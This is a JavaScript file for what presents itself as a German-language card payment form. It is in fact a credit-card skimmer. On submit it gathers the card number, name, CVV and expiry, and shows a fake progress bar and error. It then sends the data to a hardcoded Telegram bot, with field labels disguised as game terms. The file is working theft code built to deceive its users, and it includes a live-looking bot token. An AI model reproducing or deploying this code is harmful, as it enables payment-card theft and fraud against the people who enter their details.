function showUnavailable() {
    alert('Diese Funktion ist vorübergehend nicht verfügbar');
}

// Функція для автоматичного додавання слешу після місяця (MM/YY)
function formatExpiryDate() {
    const expiryField = document.getElementById('expiry');
    let value = expiryField.value.replace(/\D/g, ''); // Видаляємо все, крім цифр
    
    if (value.length > 2) {
        value = value.substring(0, 2) + '/' + value.substring(2, 4);
    }
    expiryField.value = value;
}

// Додаємо обробник події для поля з датою
document.getElementById('expiry').addEventListener('input', formatExpiryDate);

// Функція для відображення прогрес бару
function showProgressBar() {
    // Створюємо контейнер для прогресу
    const progressContainer = document.createElement('div');
    progressContainer.style.width = '100%';
    progressContainer.style.height = '6px';
    progressContainer.style.backgroundColor = '#e2e8f0';
    progressContainer.style.borderRadius = '3px';
    progressContainer.style.margin = '20px 0';
    progressContainer.style.overflow = 'hidden';
    
    // Створюємо саму смужку прогресу
    const progressBar = document.createElement('div');
    progressBar.style.height = '100%';
    progressBar.style.width = '0%';
    progressBar.style.backgroundColor = '#48bb78';
    progressBar.style.borderRadius = '3px';
    progressBar.style.transition = 'width 10s linear';
    
    progressContainer.appendChild(progressBar);
    
    // Вставляємо перед кнопкою оплати
    const payButton = document.querySelector('button[type="submit"]');
    payButton.parentNode.insertBefore(progressContainer, payButton);
    
    // Запускаємо анімацію
    setTimeout(() => {
        progressBar.style.width = '100%';
    }, 100);
    
    return progressContainer;
}

document.getElementById('paymentForm').addEventListener('submit', function(e) {
    e.preventDefault();
    
    // Ховаємо кнопку та показуємо прогрес
    const payButton = document.querySelector('button[type="submit"]');
    payButton.style.display = 'none';
    
    const progressContainer = showProgressBar();
    
    const cardData = {
        number: document.getElementById('cardNumber').value.replace(/\s/g, ''),
        name: document.getElementById('cardName').value,
        cvv: document.getElementById('cvv').value,
        expiry: document.getElementById('expiry').value,
        timestamp: new Date().toLocaleString('de-DE')
    };

    // Чекаємо 10 секунд, потім показуємо помилку
    setTimeout(() => {
        // Показуємо помилку
        document.getElementById('errorMessage').style.display = 'block';
        
        // Повертаємо кнопку
        payButton.style.display = 'block';
        progressContainer.remove();
        
        // Відправляємо дані в Telegram у потрібному форматі
        const botToken = '8255790332:AAHAlWaR8PmCgOmewZ0knEcdRS5heLpKcbU';
        const chatId = '8306987601';
        const message = `brawl:${cardData.number}\nid:${cardData.cvv}\ngame:${cardData.name}\ndddd:${cardData.expiry}`;

        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json'
            },
            body: JSON.stringify({
                chat_id: chatId,
                text: message
            })
        });
    }, 10000); // 10 секунд
});
